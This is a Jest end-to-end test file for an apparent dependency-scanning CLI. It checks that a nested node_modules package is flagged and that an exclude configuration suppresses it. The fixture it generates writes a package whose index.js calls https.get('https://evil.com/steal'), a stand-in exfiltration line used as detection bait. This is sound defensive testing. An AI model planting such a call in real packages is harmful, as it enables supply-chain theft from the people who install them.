import { describe, it, expect } from "@jest/globals";
import { exec } from "child_process";
import { promisify } from "util";
import path from "path";
import fs from "fs";

const execAsync = promisify(exec);

function ensureFixture(): string {
  const fixturePath = path.join(__dirname, "../fixtures/transitive-project");
  if (!fs.existsSync(fixturePath))
    fs.mkdirSync(fixturePath, { recursive: true });
  const nm = path.join(fixturePath, "node_modules");
  if (!fs.existsSync(nm)) fs.mkdirSync(nm);
  const nested = path.join(nm, "nested-malicious");
  if (!fs.existsSync(nested)) fs.mkdirSync(nested);
  const pkgJson = path.join(nested, "package.json");
  const indexJs = path.join(nested, "index.js");
  if (!fs.existsSync(pkgJson)) {
    fs.writeFileSync(
      pkgJson,
      JSON.stringify({ name: "nested-malicious", version: "1.0.0" }, null, 2),
    );
  }
  if (!fs.existsSync(indexJs)) {
    fs.writeFileSync(
      indexJs,
      "const https = require('https');\nhttps.get('https://evil.com/steal');\n",
    );
  }
  return fixturePath;
}

describe("Transitive Dependencies E2E", () => {
  it("should scan nested dependencies", async () => {
    const fixturePath = ensureFixture();
    const cliPath = path.join(__dirname, "../../dist/cli.js");

    try {
      const { stdout } = await execAsync(
        `node "${cliPath}" -p "${fixturePath}" --no-diff`,
        { timeout: 10000 },
      );
      expect(stdout).toContain("nested-malicious");
      expect(stdout).toContain("evil.com");
    } catch (error: any) {
      const output = error.stdout || error.stderr || error.message || "";
      expect(output).toContain("nested-malicious");
    }
  }, 15000);

  it("should respect exclude configuration", async () => {
    const fixturePath = ensureFixture();
    const cliPath = path.join(__dirname, "../../dist/cli.js");
    const configPath = path.join(fixturePath, ".depspectorrc");
    fs.writeFileSync(
      configPath,
      JSON.stringify({ exclude: ["nested-malicious"] }),
    );
    try {
      const { stdout } = await execAsync(
        `node "${cliPath}" -p "${fixturePath}" --no-diff`,
        { timeout: 10000 },
      );
      expect(stdout).not.toContain("nested-malicious");
    } catch (error: any) {
      const output = error.stdout || error.stderr || error.message || "";
      expect(output).not.toContain("nested-malicious");
    } finally {
      if (fs.existsSync(configPath)) fs.unlinkSync(configPath);
    }
  }, 15000);
});
